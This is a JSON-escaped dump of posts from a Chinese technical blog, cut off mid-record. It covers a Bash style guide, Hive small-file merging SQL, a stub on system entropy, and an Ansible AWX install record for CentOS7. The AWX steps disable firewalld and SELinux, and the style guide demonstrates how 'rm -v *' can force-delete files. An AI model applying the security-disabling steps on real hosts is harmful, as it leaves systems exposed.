\u793a\u4f8b10\uff1a\u4f4d\u7f6e\u53c2\u6570\u4f20\u9012\u63a8\u8350\u5e26\u5f15\u53f7\u7684\\"$@\\"\uff0c\u6240\u6709\u53c2\u6570\u4f5c\u4e3a\u5355\u5b57\u7b26\u4e32\u4f20\u9012\u7528\u5e26\u5f15\u53f7\u7684\\"$*\\"\\n# content of t.sh\\nfunc_t() {\\n    echo num: $#\\n    echo args: 1:$1 2:$2 3:$3\\n}\\n\\nfunc_t \\"$@\\"\\nfunc_t \\"$*\\"\\n# \u5f53\u6267\u884c ./t.sh a b c \u65f6\u8f93\u51fa\u5982\u4e0b\uff1a\\nnum: 3\\nargs: 1:a 2:b 3:c\\nnum: 1\\nargs: 1:a b c 2: 3:\\n```\\n\\n#### \u547d\u4ee4\u66ff\u6362\\n\\n\u4f7f\u7528 ```$(command)``` \u800c\u4e0d\u662f\u53cd\u5f15\u53f7\u3002\\n\\n\u56e0\u53cd\u5f15\u53f7\u5982\u679c\u8981\u5d4c\u5957\u5219\u8981\u6c42\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u5185\u90e8\u7684\u53cd\u5f15\u53f7\u3002\u800c ```$(command)``` \u5f62\u5f0f\u7684\u5d4c\u5957\u65e0\u9700\u8f6c\u4e49\uff0c\u4e14\u53ef\u8bfb\u6027\u66f4\u9ad8\u3002\\n\\n\u6b63\u4f8b\uff1a\\n```\\nvar=\\"$(command \\"$(command1)\\")\\"\\n```\\n\\n\u53cd\u4f8b\uff1a\\n```\\nvar=\\"`command \\\\`command1\\\\``\\"\\n```\\n\\n#### \u6761\u4ef6\u6d4b\u8bd5\\n\\n\u4f7f\u7528 ```[[ ... ]]``` \uff0c\u800c\u4e0d\u662f ```[``` , ```test``` , \u548c ```/usr/bin/[``` \u3002\\n\\n\u56e0\u4e3a\u5728 ```[[``` \u548c ```]]``` \u4e4b\u95f4\u4e0d\u4f1a\u51fa\u73b0\u8def\u5f84\u6269\u5c55\u6216\u5355\u8bcd\u5207\u5206\uff0c\u6240\u4ee5\u4f7f\u7528 ```[[ ... ]]``` \u80fd\u591f\u51cf\u5c11\u72af\u9519\u3002\u4e14 ```[[ ... ]]``` \u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u800c ```[ ... ]``` \u4e0d\u652f\u6301\u3002\\n\u53c2\u8003\u4ee5\u4e0b\u793a\u4f8b\uff1a\\n```\\n# \u793a\u4f8b1\uff1a\u6b63\u5219\u5339\u914d\uff0c\u6ce8\u610f\u53f3\u4fa7\u6ca1\u6709\u5f15\u53f7\\n# \u8be6\u5c3d\u7ec6\u8282\u53c2\u8003\uff1ahttp://tiswww.case.edu/php/chet/bash/FAQ \u4e2dE14\u90e8\u5206\\nif [[ \\"filename\\" =~ ^[[:alnum:]]+name ]]; then\\n    echo \\"Match\\"\\nfi\\n\\n# \u793a\u4f8b2\uff1a\u4e25\u683c\u5339\u914d\u5b57\u7b26\u4e32\\"f*\\"(\u672c\u4f8b\u4e3a\u4e0d\u5339\u914d)\\nif [[ \\"filename\\" == \\"f*\\" ]]; then\\n    echo \\"Match\\"\\nfi\\n\\n# \u793a\u4f8b3\uff1a[]\u4e2d\u53f3\u4fa7\u4e0d\u52a0\u5f15\u53f7\u5c06\u51fa\u73b0\u8def\u5f84\u6269\u5c55\uff0c\u5982\u679c\u5f53\u524d\u76ee\u5f55\u4e0b\u6709f\u5f00\u5934\u7684\u591a\u4e2a\u6587\u4ef6\u5c06\u62a5\u9519[: too many arguments\\nif [ \\"filename\\" == f* ]; then\\n    echo \\"Match\\"\\nfi\\n```\\n\\n#### \u5b57\u7b26\u4e32\u6d4b\u8bd5\\n\\n\u5c3d\u53ef\u80fd\u4f7f\u7528\u53d8\u91cf\u5f15\u7528\uff0c\u800c\u975e\u5b57\u7b26\u4e32\u8fc7\u6ee4\u3002\\n\\nBash\u53ef\u4ee5\u5f88\u597d\u7684\u5904\u7406\u7a7a\u5b57\u7b26\u4e32\u6d4b\u8bd5\uff0c\u8bf7\u4f7f\u7528\u7a7a/\u975e\u7a7a\u5b57\u7b26\u4e32\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u800c\u4e0d\u662f\u8fc7\u6ee4\u5b57\u7b26\uff0c\u8ba9\u4ee3\u7801\u5177\u6709\u66f4\u9ad8\u7684\u53ef\u8bfb\u6027\u3002\\n\u6b63\u4f8b\uff1a\\n```\\nif [[ \\"${my_var}\\" = \\"some_string\\" ]]; then\\n    do_something\\nfi\\n```\\n\u53cd\u4f8b\uff1a\\n```\\nif [[ \\"${my_var}X\\" = \\"some_stringX\\" ]]; then\\n    do_something\\nfi\\n```\\n\u6b63\u4f8b\uff1a\\n```\\n# \u4f7f\u7528-z\u6d4b\u8bd5\u5b57\u7b26\u4e32\u4e3a\u7a7a\\nif [[ -z \\"${my_var}\\" ]]; then\\n    do_something\\nfi\\n```\\n\u53cd\u4f8b\uff1a\\n```\\n# \u4f7f\u7528\u7a7a\u5f15\u53f7\u6d4b\u8bd5\u7a7a\u5b57\u7b26\u4e32\uff0c\u80fd\u7528\u4f46\u4e0d\u63a8\u8350\\nif [[ \\"${my_var}\\" = \\"\\" ]]; then\\n    do_something\\nfi\\n```\\n\\n\u6b63\u4f8b\uff1a\\n```\\n# \u4f7f\u7528-n\u6d4b\u8bd5\u975e\u7a7a\u5b57\u7b26\u4e32\\nif [[ -n \\"${my_var}\\" ]]; then\\n    do_something\\nfi\\n```\\n\u53cd\u4f8b\uff1a\\n```\\n# \u6d4b\u8bd5\u5b57\u7b26\u4e32\u975e\u7a7a\uff0c\u80fd\u7528\u4f46\u4e0d\u63a8\u8350\\nif [[ \\"${my_var}\\" ]]; then\\n    do_something\\nfi\\n```\\n\\n#### \u6587\u4ef6\u540d\u6269\u5c55\\n\\n\u5f53\u8fdb\u884c\u6587\u4ef6\u540d\u7684\u901a\u914d\u7b26\u6269\u5c55\u65f6\uff0c\u8bf7\u6307\u5b9a\u660e\u786e\u7684\u8def\u5f84\u3002\\n\\n\u5f53\u76ee\u5f55\u4e2d\u6709\u7279\u6b8a\u6587\u4ef6\u540d\u5982\u4ee5 ```-``` \u5f00\u5934\u7684\u6587\u4ef6\u65f6\uff0c\u4f7f\u7528\u5e26\u8def\u5f84\u7684\u6269\u5c55\u901a\u914d\u7b26 ```./*``` \u6bd4\u4e0d\u5e26\u8def\u5f84\u7684 ```*``` \u8981\u5b89\u5168\u5f88\u591a\u3002\\n```\\n# \u4f8b\u5982\u76ee\u5f55\u4e0b\u6709\u4ee5\u4e0b4\u4e2a\u6587\u4ef6\u548c\u5b50\u76ee\u5f55\uff1a\\n# -f  -r  somedir  somefile\\n\\n# \u672a\u6307\u5b9a\u8def\u5f84\u7684\u901a\u914d\u7b26\u6269\u5c55\u4f1a\u628a-r\u548c-f\u5f53\u4f5crm\u7684\u53c2\u6570\uff0c\u5f3a\u5236\u5220\u9664\u6587\u4ef6\uff1a\\npsa@bilby$ rm -v *\\nremoved directory: `somedir\'\\nremoved `somefile\'\\n\\n# \u800c\u6307\u5b9a\u4e86\u8def\u5f84\u7684\u5219\u4e0d\u4f1a:\\npsa@bilby$ rm -v ./*\\nremoved `./-f\'\\nremoved `./-r\'\\nrm: cannot remove `./somedir\': Is a directory\\nremoved `./somefile\'\\n```\\n\\n#### \u614e\u7528eval\\n\\n\u5e94\u8be5\u907f\u514d\u4f7f\u7528eval\u3002\\n\\nEval\u5728\u7528\u4e8e\u5206\u914d\u53d8\u91cf\u65f6\u4f1a\u4fee\u6539\u8f93\u5165\u5185\u5bb9\uff0c\u4f46\u8bbe\u7f6e\u53d8\u91cf\u7684\u540c\u65f6\u5e76\u4e0d\u80fd\u68c0\u67e5\u8fd9\u4e9b\u53d8\u91cf\u662f\u4ec0\u4e48\u3002\\n\u53cd\u4f8b\uff1a\\n```\\n# \u4ee5\u4e0b\u8bbe\u7f6e\u7684\u5185\u5bb9\u53ca\u6210\u529f\u4e0e\u5426\u5e76\u4e0d\u660e\u786e\\neval $(set_my_variables)\\n```\\n\\n#### \u614e\u7528\u7ba1\u9053\u8fde\u63a5while\u5faa\u73af\\n\\n\u8bf7\u4f7f\u7528\u8fdb\u7a0b\u66ff\u6362\u6216\u8005for\u5faa\u73af\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u7ba1\u9053\u8fde\u63a5while\u5faa\u73af\u3002\\n\\n\u8fd9\u662f\u56e0\u4e3a\u5728\u7ba1\u9053\u4e4b\u540e\u7684while\u5faa\u73af\u4e2d\uff0c\u547d\u4ee4\u662f\u5728\u4e00\u4e2a\u5b50shell\u4e2d\u8fd0\u884c\u7684\uff0c\u56e0\u6b64\u5bf9\u53d8\u91cf\u7684\u4fee\u6539\u662f\u4e0d\u80fd\u4f20\u9012\u7ed9\u7236shell\u7684\u3002\\n\\n\u8fd9\u79cd\u7ba1\u9053\u8fde\u63a5while\u5faa\u73af\u4e2d\u7684\u9690\u5f0f\u5b50shell\u4f7f\u5f97bug\u5b9a\u4f4d\u975e\u5e38\u56f0\u96be\u3002\\n\u53cd\u4f8b\uff1a\\n```\\nlast_line=\'NULL\'\\nyour_command | while read line; do\\n    last_line=\\"${line}\\"\\ndone\\n\\n# \u4ee5\u4e0b\u4f1a\u8f93\u51fa\'NULL\'\uff1a\\necho \\"${last_line}\\"\\n```\\n\\n\u5982\u679c\u4f60\u786e\u5b9a\u8f93\u5165\u4e2d\u4e0d\u5305\u542b\u7a7a\u683c\u6216\u8005\u5176\u4ed6\u7279\u6b8a\u7b26\u53f7\uff08\u901a\u5e38\u4e0d\u662f\u6765\u81ea\u7528\u6237\u8f93\u5165\uff09\uff0c\u5219\u53ef\u4ee5\u7528for\u5faa\u73af\u4ee3\u66ff\u3002\\n\u4f8b\u5982\uff1a\\n```\\ntotal=0\\n# \u4ec5\u5f53\u8fd4\u56de\u7ed3\u679c\u4e2d\u65e0\u7a7a\u683c\u7b49\u7279\u6b8a\u7b26\u53f7\u65f6\u4ee5\u4e0b\u53ef\u6b63\u5e38\u6267\u884c\uff1a\\nfor value in $(command); do\\n    total+=\\"${value}\\"\\ndone\\n```\\n\\n\u4f7f\u7528\u8fdb\u7a0b\u66ff\u6362\u53ef\u5b9e\u73b0\u91cd\u5b9a\u5411\u8f93\u51fa\uff0c\u4f46\u662f\u8bf7\u5c06\u547d\u4ee4\u653e\u5165\u663e\u5f0f\u5b50shell\uff0c\u800c\u975ewhile\u5faa\u73af\u521b\u5efa\u7684\u9690\u5f0f\u5b50shell\u3002\\n\u4f8b\u5982\uff1a\\n```\\ntotal=0\\nlast_file=\\n# \u6ce8\u610f\u4e24\u4e2a<\u4e4b\u95f4\u6709\u7a7a\u683c\uff0c\u7b2c\u4e00\u4e2a\u4e3a\u91cd\u5b9a\u5411\uff0c\u7b2c\u4e8c\u4e2a<()\u4e3a\u8fdb\u7a0b\u66ff\u6362\\nwhile read count filename; do\\n    total+=\\"${count}\\"\\n    last_file=\\"${filename}\\"\\ndone < <(your_command | uniq -c)\\n\\necho \\"Total = ${total}\\"\\necho \\"Last one = ${last_file}\\"\\n```\\n\\n#### \u68c0\u67e5\u8fd4\u56de\u503c\\n\\n\u603b\u662f\u68c0\u67e5\u8fd4\u56de\u503c\uff0c\u4e14\u63d0\u4f9b\u6709\u7528\u7684\u8fd4\u56de\u503c\u3002\\n\\n\u5bf9\u4e8e\u975e\u7ba1\u9053\u547d\u4ee4\uff0c\u4f7f\u7528 ```$?``` \u6216\u76f4\u63a5\u901a\u8fc7 ```if``` \u8bed\u53e5\u6765\u68c0\u67e5\u4ee5\u4fdd\u6301\u5176\u7b80\u6d01\u3002\\n\\n\u4f8b\u5982\uff1a\\n```\\n# \u4f7f\u7528if\u8bed\u53e5\u5224\u65ad\u6267\u884c\u7ed3\u679c\\nif ! mv \\"${file_list}\\" \\"${dest_dir}/\\" ; then\\n    echo \\"Unable to move ${file_list} to ${dest_dir}\\" >&2\\n    exit \\"${E_BAD_MOVE}\\"\\nfi\\n\\n# \u6216\u8005\u4f7f\u7528$?\\nmv \\"${file_list}\\" \\"${dest_dir}/\\"\\nif [[ $? -ne 0 ]]; then\\n    echo \\"Unable to move ${file_list} to ${dest_dir}\\" >&2\\n    exit \\"${E_BAD_MOVE}\\"\\nfi\\n```\\n\\n#### \u5185\u5efa\u547d\u4ee4\u548c\u5916\u90e8\u547d\u4ee4\\n\\n\u5f53\u5185\u5efa\u547d\u4ee4\u53ef\u4ee5\u5b8c\u6210\u76f8\u540c\u7684\u4efb\u52a1\u65f6\uff0c\u5728shell\u5185\u5efa\u547d\u4ee4\u548c\u8c03\u7528\u5916\u90e8\u547d\u4ee4\u4e4b\u95f4\uff0c\u5e94\u5c3d\u91cf\u9009\u62e9\u5185\u5efa\u547d\u4ee4\u3002\\n\\n\u56e0\u5185\u5efa\u547d\u4ee4\u76f8\u6bd4\u5916\u90e8\u547d\u4ee4\u800c\u8a00\u4f1a\u4ea7\u751f\u66f4\u5c11\u7684\u4f9d\u8d56\uff0c\u4e14\u591a\u6570\u60c5\u51b5\u8c03\u7528\u5185\u5efa\u547d\u4ee4\u6bd4\u8c03\u7528\u5916\u90e8\u547d\u4ee4\u53ef\u4ee5\u83b7\u5f97\u66f4\u597d\u7684\u6027\u80fd\uff08\u901a\u5e38\u5916\u90e8\u547d\u4ee4\u4f1a\u4ea7\u751f\u989d\u5916\u7684\u8fdb\u7a0b\u5f00\u9500\uff09\u3002\\n\\n\u6b63\u4f8b\uff1a\\n```\\n# \u4f7f\u7528\u5185\u5efa\u7684\u7b97\u672f\u6269\u5c55\\naddition=$((${X} + ${Y}))\\n# \u4f7f\u7528\u5185\u5efa\u7684\u5b57\u7b26\u4e32\u66ff\u6362\\nsubstitution=\\"${string/#foo/bar}\\"\\n```\\n\u53cd\u4f8b\uff1a\\n```\\n# \u8c03\u7528\u5916\u90e8\u547d\u4ee4\u8fdb\u884c\u7b80\u5355\u7684\u8ba1\u7b97\\naddition=\\"$(expr ${X} + ${Y})\\"\\n# \u8c03\u7528\u5916\u90e8\u547d\u4ee4\u8fdb\u884c\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u66ff\u6362\\nsubstitution=\\"$(echo \\"${string}\\" | sed -e \'s/^foo/bar/\')\\"\\n```\\n#### \u6587\u4ef6\u52a0\u8f7d\\n\u52a0\u8f7d\u5916\u90e8\u5e93\u6587\u4ef6\u4e0d\u5efa\u8bae\u7528\u4f7f\u7528```.```\uff0c\u5efa\u8bae\u4f7f\u7528```source```\uff0c\u5df2\u63d0\u5347\u53ef\u9605\u8bfb\u6027\u3002\\n\u6b63\u4f8b\uff1a\\n```\\nsource my_libs.sh\\n```\\n\u53cd\u4f8b\uff1a\\n```\\n. my_libs.sh\\n```\\n\\n#### \u5185\u5bb9\u8fc7\u6ee4\u4e0e\u7edf\u8ba1\\n\u9664\u975e\u5fc5\u8981\u60c5\u51b5\uff0c\u5c3d\u91cf\u4f7f\u7528\u5355\u4e2a\u547d\u4ee4\u53ca\u5176\u53c2\u6570\u7ec4\u5408\u6765\u5b8c\u6210\u4e00\u9879\u4efb\u52a1\uff0c\u800c\u975e\u591a\u4e2a\u547d\u4ee4\u52a0\u4e0a\u7ba1\u9053\u7684\u4e0d\u5fc5\u8981\u7ec4\u5408\u3002\\n\u5e38\u89c1\u7684\u4e0d\u5efa\u8bae\u7684\u7528\u6cd5\u4f8b\u5982\uff1acat\u548cgrep\u8fde\u7528\u8fc7\u6ee4\u5b57\u7b26\u4e32; cat\u548cwc\u8fde\u7528\u7edf\u8ba1\u884c\u6570; grep\u548cwc\u8fde\u7528\u7edf\u8ba1\u884c\u6570\u7b49\u3002\\n\\n\u6b63\u4f8b\uff1a\\n```\\ngrep net.ipv4 /etc/sysctl.conf\\ngrep -c net.ipv4 /etc/sysctl.conf\\nwc -l /etc/sysctl.conf\\n```\\n\u53cd\u4f8b\uff1a\\n```\\ncat /etc/sysctl.conf | grep net.ipv4\\ngrep net.ipv4 /etc/sysctl.conf | wc -l\\ncat /etc/sysctl.conf | wc -l\\n```\\n\\n#### \u6b63\u786e\u4f7f\u7528\u8fd4\u56de\u4e0e\u9000\u51fa\\n\u9664\u7279\u6b8a\u60c5\u51b5\u5916\uff0c\u51e0\u4e4e\u6240\u6709\u51fd\u6570\u90fd\u4e0d\u5e94\u8be5\u4f7f\u7528```exit```\u76f4\u63a5\u9000\u51fa\u811a\u672c\uff0c\u800c\u5e94\u8be5\u4f7f\u7528```return```\u8fdb\u884c\u8fd4\u56de\uff0c\u4ee5\u4fbf\u540e\u7eed\u903b\u8f91\u4e2d\u53ef\u4ee5\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\u3002\\n\u6b63\u4f8b\uff1a\\n```\\n# \u5f53\u51fd\u6570\u8fd4\u56de\u540e\u53ef\u4ee5\u7ee7\u7eed\u6267\u884ccleanup\\nmy_func() {\\n    [[ -e /dummy ]] || return 1\\n}\\n\\ncleanup() {\\n    ...\\n}\\n\\nmy_func\\ncleanup\\n```\\n\\n\u53cd\u4f8b\uff1a\\n```\\n# \u5f53\u51fd\u6570\u9000\u51fa\u65f6\uff0ccleanup\u5c06\u4e0d\u4f1a\u88ab\u6267\u884c\\nmy_func() {\\n    [[ -e /dummy ]] || exit 1\\n}\\n\\ncleanup() {\\n    ...\\n}\\n\\nmy_func\\ncleanup\\n```\\n\\n## \u9644\uff1a\u5e38\u7528\u5de5\u5177\\n\u63a8\u8350\u4ee5\u4e0b\u5de5\u5177\u5e2e\u52a9\u6211\u4eec\u8fdb\u884c\u4ee3\u7801\u7684\u89c4\u8303\uff1a\\n- [ShellCheck](https://shellcheck.storage.googleapis.com/index.html \\"shell script analysis tool\\")"},{"id":"/2019/09/02/hive-small-file","metadata":{"permalink":"/notes/blog/2019/09/02/hive-small-file","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2019-09-02-hive-small-file.md","source":"@site/blog/2019-09-02-hive-small-file.md","title":"HIVE\u4e2d\u5e38\u89c1\u7684\u5c0f\u6587\u4ef6\u5408\u5e76\u65b9\u6cd5","description":"hive\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e94\u5c3d\u91cf\u907f\u514d\u4ea7\u751f\u5c0f\u6587\u4ef6","date":"2019-09-02T00:00:00.000Z","tags":[{"inline":true,"label":"hive","permalink":"/notes/blog/tags/hive"}],"readingTime":0.57,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"HIVE\u4e2d\u5e38\u89c1\u7684\u5c0f\u6587\u4ef6\u5408\u5e76\u65b9\u6cd5","description":"hive\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u5e94\u5c3d\u91cf\u907f\u514d\u4ea7\u751f\u5c0f\u6587\u4ef6","categories":["bigdata"],"tags":["hive"]},"unlisted":false,"prevItem":{"title":"shell style guide","permalink":"/notes/blog/2020/01/03/shell-standards"},"nextItem":{"title":"\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u548c\u71b5\u503c","permalink":"/notes/blog/2019/05/12/random-and-entropy-in-centos7"}},"content":"> \u4ecb\u7ecdhive\u5c0f\u6587\u4ef6\u5e38\u89c1\u5904\u7406\u65b9\u6cd5\\n\\n\\n## hive\u7684\u6587\u4ef6\u4ea7\u751f\u8fc7\u7a0b\\n\\n\\n## \u5c0f\u6587\u4ef6\u592a\u591a\u7684\u5f71\u54cd\\n\\n\\n## \u4e3a\u4ec0\u4e48\u4f1a\u4ea7\u751f\u5c0f\u6587\u4ef6\\n\\n## \u5982\u4f55\u5904\u7406\u5c0f\u6587\u4ef6\\n\\n### case 1\\n```\\nINSERT OVERWRITE TABLE tb1\\n    SELECT * FROM tb2\\nORDER BY 1;\\nALTER TABLE tb2 RENAME TO b_tb2;\\nALTER TABLE tb1 RENAME TO tb2;\\n\\n```\\n### case 2\\n```\\nINSERT TABLE tb1\\nSELECT c1, c2 FROM (\\n    SELECT c1, c2\\n    FROM tb2\\n    WHERE xxx\\n      AND xxx\\n) t\\nORDER BY c1, c2;\\n```\\n\\n### case 3\\n```\\nSELECT c1\\nFROM  (\\n    xxx\\n) t\\nGROUP BY x;\\n```\\n\\n### case 4\\n```\\nINSERT OVERWRITE TABLE tb1\\nSELECT\\n    xxx\\nFROM\\n    xxx\\n    WHERE\\n        xxx) t\\ndistribute by rand();\\n```\\n\\n### case 5\\n```\\nINSERT TABLE tb1\\nSELECT c1,c2\\nFROM tb2\\nWHERE xxx\\nsort by c1;\\n```"},{"id":"/2019/05/12/random-and-entropy-in-centos7","metadata":{"permalink":"/notes/blog/2019/05/12/random-and-entropy-in-centos7","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2019-05-12-random-and-entropy-in-centos7.md","source":"@site/blog/2019-05-12-random-and-entropy-in-centos7.md","title":"\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u548c\u71b5\u503c","description":"\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u4ee5\u53ca\u76f8\u5173\u95ee\u9898","date":"2019-05-12T00:00:00.000Z","tags":[{"inline":true,"label":"centos7","permalink":"/notes/blog/tags/centos-7"},{"inline":true,"label":"random","permalink":"/notes/blog/tags/random"},{"inline":true,"label":"entropy","permalink":"/notes/blog/tags/entropy"}],"readingTime":0.38,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u548c\u71b5\u503c","description":"\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u4ee5\u53ca\u76f8\u5173\u95ee\u9898","categories":["os"],"tags":["centos7","random","entropy"]},"unlisted":false,"prevItem":{"title":"HIVE\u4e2d\u5e38\u89c1\u7684\u5c0f\u6587\u4ef6\u5408\u5e76\u65b9\u6cd5","permalink":"/notes/blog/2019/09/02/hive-small-file"},"nextItem":{"title":"CentOS7\u7cfb\u7edf\u5b89\u88c5ansible awx\u8bb0\u5f55","permalink":"/notes/blog/2017/12/20/centos7-install-ansible-awx"}},"content":"> \u672c\u6587\u8bd5\u7740\u603b\u7ed3\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u524d\u524d\u540e\u540e\u4ee5\u53ca\u7ba1\u7406\u4e2d\u9700\u8981\u6ce8\u610f\u7684\u95ee\u9898 [\u5148\u6b20\u7740]\\n\\n\\n## 1 \u4ec0\u4e48\u662f\u968f\u673a\u6570\uff1f\\n\\n\u968f\u673a\u6570\u5c31\u662f\u65e0\u6cd5\u9884\u6d4b\u7684\u6570\\n\\n## 2 \u968f\u673a\u6570\u6709\u4ec0\u4e48\u7528\uff1f\\n\\n\u968f\u673a\u662f\u4e3a\u4e86\u5b89\u5168\\n\\n## 3 \u5982\u4f55\u83b7\u5f97\u968f\u673a\u6570\uff1f\\n\\n/dev/random\\n/dev/urandom\\n/proc/sys/kernel/random/entropy_avail\\n\\n## 4 \u4f1a\u6709\u54ea\u4e9b\u95ee\u9898\uff1f\\n\\n1 \u968f\u673a\u6570\u6570\u4ea7\u751f\u901f\u5ea6\u6162\\n2 \u5f71\u54cd\u4e0a\u5c42\u5e94\u7528\\n\\n## haveged \u548c rng-tools"},{"id":"/2017/12/20/centos7-install-ansible-awx","metadata":{"permalink":"/notes/blog/2017/12/20/centos7-install-ansible-awx","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2017-12-20-centos7-install-ansible-awx.md","source":"@site/blog/2017-12-20-centos7-install-ansible-awx.md","title":"CentOS7\u7cfb\u7edf\u5b89\u88c5ansible awx\u8bb0\u5f55","description":"\u8bb0\u5f55awx\u7684\u5b89\u88c5\u6d4b\u8bd5\u8fc7\u7a0b\u4ee5\u53ca\u9700\u8981\u6ce8\u610f\u7684\u70b9","date":"2017-12-20T00:00:00.000Z","tags":[{"inline":true,"label":"system","permalink":"/notes/blog/tags/system"},{"inline":true,"label":"shell","permalink":"/notes/blog/tags/shell"}],"readingTime":1.29,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"CentOS7\u7cfb\u7edf\u5b89\u88c5ansible awx\u8bb0\u5f55","description":"\u8bb0\u5f55awx\u7684\u5b89\u88c5\u6d4b\u8bd5\u8fc7\u7a0b\u4ee5\u53ca\u9700\u8981\u6ce8\u610f\u7684\u70b9","categories":["system"],"tags":["system","shell"]},"unlisted":false,"prevItem":{"title":"\u7cfb\u7edf\u4e2d\u7684\u968f\u673a\u6570\u548c\u71b5\u503c","permalink":"/notes/blog/2019/05/12/random-and-entropy-in-centos7"},"nextItem":{"title":"\u5f88\u8be1\u5f02\u7684\u670d\u52a1\u65e5\u5fd7\u65e0\u6cd5\u5207\u5272\u95ee\u9898\u5206\u6790","permalink":"/notes/blog/2017/10/19/bash-nohup-log-truncate"}},"content":"> \u8bb0\u5f55awx\u7684\u5b89\u88c5\u6d4b\u8bd5\u8fc7\u7a0b\u4ee5\u53ca\u9700\u8981\u6ce8\u610f\u7684\u70b9\\n\\n\\n## \u5173\u4e8eawx\\n\\nawx(https://github.com/ansible/awx)\u662fansible tower\u7684\u5f00\u6e90\u7248\u672c\uff0c\u4f5c\u4e3atower\u7684upstream\u5bf9\u5916\u5f00\u6e90\uff0c\\n\u9879\u76ee\u4ece2013\u5e74\u5f00\u59cb\u7ef4\u62a4\uff0c2017\u5e74\u7531redhat\u5bf9\u5916\u5f00\u6e90\uff0c\u76ee\u524d\u7ef4\u62a4\u5f97\u6bd4\u8f83\u6d3b\u8dc3\u3002\u7531\u4e8e\u5b98\u65b9\u7684install guide\u5199\u5f97\u6709\u70b9\u6742\u4e0d\u662f\u5f88\u76f4\u89c2\uff0c\\n\u5bfc\u81f4\u60f3\u8981\u5b89\u88c5\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u73af\u5883\u4f53\u9a8c\u4e00\u4e0b\u529f\u80fd\u90fd\u8981\u6298\u817e\u534a\u5929\uff0c\u8fd9\u91cc\u63d0\u4f9b\u4e00\u4e2a\u7b80\u5355\u7248\u672c\u7684\u5b89\u88c5\u6d41\u7a0b\u65b9\u4fbf\u5feb\u901f\u4f53\u9a8c\u3002\\n\\n## \u5b89\u88c5\u8fc7\u7a0b\\n\\n\u5b89\u88c5\u8f6f\u4ef6\u5305\\n\\n```\\nyum -y install epel-release\\nsystemctl disable firewalld\\nsystemctl stop firewalld\\nsed -i \'s/SELINUX=enforcing/SELINUX=disabled/g\' /etc/selinux/config\\nsetenforce 0\\nyum -y install git gettext ansible docker nodejs npm gcc-c++ bzip2 python-docker-py\\n```\\n\u542f\u52a8\u670d\u52a1\\n\\n```\\nsystemctl start docker\\nsystemctl enable docker\\n```\\n\\nclone awx\u4ee3\u7801\\n\\n```\\ngit clone https://github.com/ansible/awx.git\\ncd awx/installer/\\n# \u6ce8\u610f\u4fee\u6539\u4e00\u4e0bpostgres_data_dir\u5230\u5176\u4ed6\u76ee\u5f55\u6bd4\u5982/data/pgdocker\\nvi inventory\\nansible-playbook -i inventory install.yml\\n```\\n\\n\u68c0\u67e5\u65e5\u5fd7\\n\\n```\\ndocker logs -f awx_task\\n```\\n\\n\u4ee5\u4e0a\u662f\u5b89\u88c5\u8fc7\u7a0b\uff0c\u56e0\u4e3a\u672c\u5730\u73af\u5883\u8bbf\u95ee\u5916\u7f51\u8981\u7ecf\u8fc7\u4ee3\u7406\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u914d\u7f6edocker\u901a\u8fc7\u4ee3\u7406\u8bbf\u95ee\u5916\u7f51\u7684\u65b9\u5f0f\uff0c\u5426\u5219pull image\u4f1a\u6709\u95ee\u9898\u3002\\n\\n```\\nmkdir /etc/systemd/system/docker.service.d/\\ncat > /etc/systemd/system/docker.service.d/http-proxy.conf <<EOF\\n[Service]\\nEnvironment=\\"HTTP_PROXY=proxy.test.dev:8080\\" \\"HTTPS_PROXY=proxy.test.dev:8080\\" \\"NO_PROXY=localhost,127.0.0.1,172.1.0.2\\"\\nEOF\\n\\nsystemctl daemon-reload\\nsystemctl restart docker\\nsystemctl show --property=Environment docker\\n```\\n\\n\\n\\n\\n\u53c2\u8003\u6587\u6863\uff1a\\n\\n[1] http://khmel.org/?p=1245\\n\\n[2] https://docs.docker.com/engine/admin/systemd/#httphttps-proxy"},{"id":"/2017/10/19/bash-nohup-log-truncate","metadata":{"permalink":"/notes/blog/2017/10/19/bash-nohup-log-truncate","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2017-10-19-bash-nohup-log-truncate.md","source":"@site/blog/2017-10-19-bash-nohup-log-truncate.md","title":"\u5f88\u8be1\u5f02\u7684\u670d\u52a1\u65e5\u5fd7\u65e0\u6cd5\u5207\u5272\u95ee\u9898\u5206\u6790","description":"\u9047\u5230\u67d0\u670d\u52a1\u8fdb\u7a0b\u4ea7\u751f\u7684\u65e5\u5fd7\u59cb\u7ec8\u65e0\u6cd5\u5207\u5272\uff0c\u539f\u6765\u539f\u56e0\u5728\u8fd9\u91cc","date":"2017-10-19T00:00:00.000Z","tags":[{"inline":true,"label":"system","permalink":"/notes/blog/tags/system"},{"inline":true,"label":"shell","permalink":"/notes/blog/tags/shell"}],"readingTime":2.37,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u5f88\u8be1\u5f02\u7684\u670d\u52a1\u65e5\u5fd7\u65e0\u6cd5\u5207\u5272\u95ee\u9898\u5206\u6790","description":"\u9047\u5230\u67d0\u670d\u52a1\u8fdb\u7a0b\u4ea7\u751f\u7684\u65e5\u5fd7\u59cb\u7ec8\u65e0\u6cd5\u5207\u5272\uff0c\u539f\u6765\u539f\u56e0\u5728\u8fd9\u91cc","categories":["system"],"tags